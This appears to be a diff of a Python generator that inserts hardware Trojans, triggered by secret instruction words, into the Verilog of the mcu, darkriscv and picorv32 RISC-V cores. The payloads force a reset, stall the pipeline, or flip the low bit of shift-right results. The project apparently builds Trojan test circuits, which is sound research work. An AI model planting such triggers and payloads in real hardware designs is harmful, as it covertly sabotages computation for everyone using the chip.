@@ -259,3 +259,184 @@ def insert_dark_trojan(
     decl = DARK_TRIGGER_COMMENT + decl
     idx = patched.rindex("endmodule")
     return patched[:idx] + decl + patched[idx:]
+
+
+# --- rc1 (2026-11-04), Peter's continuation-3 decisions: "1a with a secret program that
+# activates trojans (right?)"; "2 that's fine, but why not a trojan that messes up the lsb of an
+# alu operation (maybe shift right) or rotate" -- RV32I has no rotate instruction (checked: the
+# base integer set has no ROR/ROL/RORI opcode; the brief's "check, state it" answer is "no rotate
+# in RV32I", so only the shift-right LSB-flip variant is built). Each Trojan now carries its own
+# PAYLOAD KIND, independent of the others in the same circuit (brief Continuation 3 step 2:
+# "kinds drawn per Trojan"): "reset" (the existing p-dos-reset mechanism), "stall" (the existing
+# p-dos-stuck mechanism), "alu" (new: flip bit 0 of a shift-right result -- SRL/SRA/SRLI/SRAI --
+# while triggered, on the core's own ALU result wire, found by reading each core's ALU/writeback
+# path, not guessed).
+PAYLOAD_KINDS = ("reset", "stall", "alu")
+
+# mcu: the EX (execution_unit) instance connection carrying the raw ALU result into
+# single_cycle_core.v, found by reading single_cycle_core.v (the `.ALU_result(ALU_result)` line
+# is not unique in the file -- WB (writeback_unit) reads the same wire by the same port name a
+# few lines later -- so the anchor is the 3-line block around the EX instance's own output ports,
+# which is unique).
+MCU_ALU_ANCHOR = "  .branch(branch),\n  .ALU_result(ALU_result),\n  .JALR_target(JALR_target),"
+MCU_ALU_ANCHOR_PATCHED = (
+    "  .branch(branch),\n  .ALU_result(__htl_alu_raw),\n  .JALR_target(JALR_target),"
+)
+
+# darkriscv: RMDATA is the combinational ALU result wire (`always`-free `assign`-style wire
+# declaration higher up in the file); its one write-back use is this line (unique, checked).
+DARK_RMDATA_LINE = "                  MCC||RCC ? RMDATA:"
+DARK_RMDATA_LINE_PATCHED = "                  MCC||RCC ? __htl_rmdata:"
+
+# darkriscv stall payload: HLT is a combinational `wire HLT = ...;` (multi-line, `||`-chained);
+# OR'ing a trigger into its own *definition* (not into the trigger-sampling net, which round 10's
+# darkriscv rc1 note already rejected for IDATA/IDACK reasons unrelated to this payload target)
+# forces the pipeline's own stall condition permanently true while triggered -- a genuine stall,
+# distinct from darkriscv's existing reset payload on XRES.
+DARK_HLT_LINE = "    wire HLT =\n"
+DARK_HLT_LINE_PATCHED = "    wire HLT =\n                __htl_trigger_stall ||\n"
+
+DARK_XRES_LINE_KINDED_PATCHED = "        XRES <= RES || __htl_trigger_reset;"
+
+# picorv32 (external/picorv32, YosysHQ, ISC license; default parameters: no ENABLE_MUL/
+# ENABLE_DIV/ENABLE_IRQ -- Q-L12's finding on the multiplier/divide submodules is unaffected by
+# this round's additions, which touch none of them). Trigger: `next_insn_opcode`, a register that
+# updates only on a completed memory transfer (`if (mem_xfer) next_insn_opcode <= ...;`) and holds
+# its value otherwise -- the brief's "always defined after reset" requirement, same intent as
+# darkriscv's XIDATA.
+PICO_TRIGGER_SAMPLE = "next_insn_opcode"
+PICO_CLOCK = "clk"
+
+# Reset payload: the FSM's own `if (!resetn) begin ... end else case (cpu_state) ...` branch
+# (single `always @(posedge clk)` block controlling reg_pc/reg_next_pc/cpu_state and friends).
+# This exact `!resetn` line is not unique on its own (several unrelated always blocks each reset
+# their own registers the same way); the 4-line anchor ending in it is unique.
+PICO_RESET_ANCHOR = "\t\tif (!ENABLE_TRACE)\n\t\t\ttrace_data <= 'bx;\n\n\t\tif (!resetn) begin\n"
+PICO_RESET_ANCHOR_PATCHED = (
+    "\t\tif (!ENABLE_TRACE)\n\t\t\ttrace_data <= 'bx;\n\n"
+    "\t\tif (!resetn || __htl_trigger_reset) begin\n"
+)
+
+# Stall payload: `decoder_trigger` only ever becomes 1 after a completed instruction fetch
+# (`decoder_trigger <= mem_do_rinst && mem_done;`); forcing it to 0 while triggered means the
+# decode stage never launches another instruction -- the core holds its current architectural
+# state forever, a stall rather than a restart (unlike the reset payload above).
+PICO_STALL_LINE = "\t\tdecoder_trigger <= mem_do_rinst && mem_done;"
+PICO_STALL_LINE_PATCHED = "\t\tdecoder_trigger <= !__htl_trigger_stall && mem_do_rinst && mem_done;"
+
+# ALU payload: `cpu_state_shift`'s own completion branch (`reg_sh == 0`) writes the finished
+# shift result to `reg_out` (this single line is unique: every other `reg_out <=` assignment in
+# the file sets it from a different source). `instr_srli`/`instr_srl`/`instr_srai`/`instr_sra`
+# are the module's own per-opcode decode flags (declared near the top of the file), so no new
+# decode logic is needed to tell a shift-right apart from a shift-left here.
+PICO_ALU_LINE = "\t\t\t\t\treg_out <= reg_op1;\n"
+PICO_ALU_LINE_PATCHED = (
+    "\t\t\t\t\treg_out <= (__htl_trigger_alu && (instr_srli || instr_srl "
+    "|| instr_srai || instr_sra))\n"
+    "\t\t\t\t\t\t? {reg_op1[31:1], ~reg_op1[0]} : reg_op1;\n"
+)
+
+
+def _kinded_triggers_decl(
+    magic_words: list[int], kinds: list[str], sample_wire: str, valid_wire: str | None, *,
+    force_inactive: bool = False,
+) -> tuple[str, list[str]]:
+    """Like `_independent_triggers_decl`, plus three combined wires (`__htl_trigger_reset`,
+    `__htl_trigger_stall`, `__htl_trigger_alu`), each the OR of the per-Trojan trigger wires whose
+    own `kinds[i]` matches (brief Continuation 3 step 2: "kinds drawn per Trojan"); a kind with no
+    Trojan this circuit is wired to `1'b0`, so every payload site can always read its own combined
+    wire without a Python-side conditional."""
+    if len(magic_words) != len(kinds):
+        raise ValueError("one kind per magic word")
+    bad = [k for k in kinds if k not in PAYLOAD_KINDS]
+    if bad:
+        raise ValueError(f"kind must be one of {PAYLOAD_KINDS}, got {bad}")
+    decl, names = _independent_triggers_decl(
+        magic_words, sample_wire, valid_wire, force_inactive=force_inactive)
+    lines = [decl.rstrip("\n")]
+    for kind in PAYLOAD_KINDS:
+        matched = [n for n, k in zip(names, kinds, strict=True) if k == kind]
+        expr = " | ".join(matched) if matched else "1'b0"
+        lines.append(f"  wire __htl_trigger_{kind} = {expr};")
+    return "\n".join(lines) + "\n", names
+
+
+def insert_mcu_kinded_multitrojan(
+    source: str, magic_words: list[int], kinds: list[str], *, force_inactive: bool = False
+) -> tuple[str, list[str]]:
+    """rc1 Continuation 3: 1-3 independent Trojans on mcu, each its own payload kind (reset/
+    stall/alu). Reset reuses the existing `__htl_pc_mux` payload point with a second encoding
+    (`2'b11`, `fetch_issue.v`'s own case default: `PC_reg <= {ADDRESS_BITS{1'b0}}`, a jump to
+    address 0 -- a genuine restart, distinct from the existing stall encoding `2'b01`); alu is new
+    (`MCU_ALU_ANCHOR`, the EX instance's `ALU_result` port)."""
+    for anchor in (MCU_FI_CONNECTION, MCU_ALU_ANCHOR):
+        if anchor not in source or source.count(anchor) != 1:
+            raise PatchNotFound(f"{anchor!r} not found (or not unique) in single_cycle_core.v")
+    patched = source.replace(MCU_FI_CONNECTION, MCU_FI_CONNECTION_PATCHED)
+    patched = patched.replace(MCU_ALU_ANCHOR, MCU_ALU_ANCHOR_PATCHED)
+    decl, names = _kinded_triggers_decl(
+        magic_words, kinds, "instruction", None, force_inactive=force_inactive)
+    decl += (
+        "  wire [1:0] __htl_pc_mux = __htl_trigger_stall ? 2'b01 :\n"
+        "                            __htl_trigger_reset ? 2'b11 : next_PC_select;\n"
+        "  wire [31:0] __htl_alu_raw;\n"
+        "  assign ALU_result = (__htl_trigger_alu && "
+        "(ALU_operation==6'd12 || ALU_operation==6'd13))\n"
+        "                       ? {__htl_alu_raw[31:1], ~__htl_alu_raw[0]} : __htl_alu_raw;\n"
+    )
+    idx = patched.rindex("endmodule")
+    return patched[:idx] + decl + patched[idx:], names
+
+
+def insert_dark_kinded_multitrojan(
+    source: str, magic_words: list[int], kinds: list[str], *, force_inactive: bool = False
+) -> tuple[str, list[str]]:
+    """rc1 Continuation 3: 1-3 independent Trojans on darkriscv, each its own payload kind. Reset
+    reuses the existing XRES payload point; stall is new (`DARK_HLT_LINE`, the pipeline's own
+    stall condition, not the comparator sampling net round 10 moved off of `IDATA`/`IDACK`); alu
+    is new (`DARK_RMDATA_LINE`, the ALU's write-back use of its own `RMDATA` wire)."""
+    for anchor in (DARK_XRES_LINE, DARK_HLT_LINE, DARK_RMDATA_LINE):
+        if anchor not in source or source.count(anchor) != 1:
+            raise PatchNotFound(f"{anchor!r} not found (or not unique) in darkriscv.v")
+    patched = source.replace(DARK_XRES_LINE, DARK_XRES_LINE_KINDED_PATCHED)
+    patched = patched.replace(DARK_HLT_LINE, DARK_HLT_LINE_PATCHED)
+    patched = patched.replace(DARK_RMDATA_LINE, DARK_RMDATA_LINE_PATCHED)
+    decl, names = _kinded_triggers_decl(
+        magic_words, kinds, "XIDATA", None, force_inactive=force_inactive)
+    decl = (
+        DARK_TRIGGER_COMMENT + decl
+        + "  wire [31:0] __htl_rmdata = (__htl_trigger_alu && (FCT3==3'd5))\n"
+        "                       ? {RMDATA[31:1], ~RMDATA[0]} : RMDATA;\n"
+    )
+    idx = patched.rindex("endmodule")
+    return patched[:idx] + decl + patched[idx:], names
+
+
+def insert_picorv32_kinded_multitrojan(
+    source: str, magic_words: list[int], kinds: list[str], *, force_inactive: bool = False
+) -> tuple[str, list[str]]:
+    """rc1 Continuation 3 (controller addition, 2026-11-04, "Why can't we use picorv32?"): 1-3
+    independent Trojans on picorv32 (external/picorv32, default params: no ENABLE_MUL/DIV/IRQ),
+    each its own payload kind, found by reading `picorv32.v`'s single-cycle-state-machine core
+    (not guessed): trigger on `next_insn_opcode` (the latched fetched-instruction register); reset
+    re-enters the FSM's own `!resetn` branch (`PICO_RESET_ANCHOR`); stall gates `decoder_trigger`
+    so the decode stage never launches another instruction (`PICO_STALL_LINE`); alu flips bit 0 of
+    a completed SRL/SRA/SRLI/SRAI result at `cpu_state_shift`'s own write-back line
+    (`PICO_ALU_LINE`)."""
+    for anchor in (PICO_RESET_ANCHOR, PICO_STALL_LINE, PICO_ALU_LINE):
+        if anchor not in source or source.count(anchor) != 1:
+            raise PatchNotFound(f"{anchor!r} not found (or not unique) in picorv32.v")
+    patched = source.replace(PICO_RESET_ANCHOR, PICO_RESET_ANCHOR_PATCHED)
+    patched = patched.replace(PICO_STALL_LINE, PICO_STALL_LINE_PATCHED)
+    patched = patched.replace(PICO_ALU_LINE, PICO_ALU_LINE_PATCHED)
+    decl, names = _kinded_triggers_decl(
+        magic_words, kinds, PICO_TRIGGER_SAMPLE, None, force_inactive=force_inactive)
+    # picorv32.v holds several modules (picorv32, picorv32_regs, picorv32_pcpi_mul, ...,
+    # picorv32_axi, picorv32_wb); `str.rindex("endmodule")` (every other inserter in this file
+    # uses it, safe there -- their upstream files hold exactly one module) would land the new
+    # declarations in whichever module happens to close last in the file, not in `picorv32`
+    # itself. Verilog modules do not nest, so the first `endmodule` after `picorv32`'s own
+    # `module` line is always its own.
+    mod_start = patched.index("module picorv32 #(")
+    idx = patched.index("endmodule", mod_start)
+    return patched[:idx] + decl + patched[idx:], names
